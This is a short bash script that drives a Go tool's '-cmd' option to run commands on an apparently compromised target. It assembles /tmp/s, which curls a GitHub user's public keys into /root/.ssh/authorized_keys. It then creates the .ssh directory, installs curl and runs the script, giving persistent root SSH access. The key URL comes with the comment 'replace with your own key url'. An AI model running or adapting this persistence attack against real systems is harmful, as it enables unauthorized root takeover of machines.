#!/bin/bash

# add keys to authorized_keys
go run . -cmd "echo -n \"curl https://github.com\" >> /tmp/s"
go run . -cmd "echo -n \"/LuukBlankenstijn.keys \" >> /tmp/s" # replace with your own key url
go run . -cmd "echo \">> /root/.ssh/authorized_keys\" >> /tmp/s"

# wait ten seconds
sleep 10

# create .ssh directory and authorized_keys file, install curl
go run . -cmd "mkdir -p /root/.ssh"
go run . -cmd "touch /root/.ssh/authorized_keys"
go run . -cmd "apt update && apt install -y curl"

#wait ten seconds
sleep 10

# execute the script
go run . -cmd "chmod +x /tmp/s"
go run . -cmd "/tmp/s"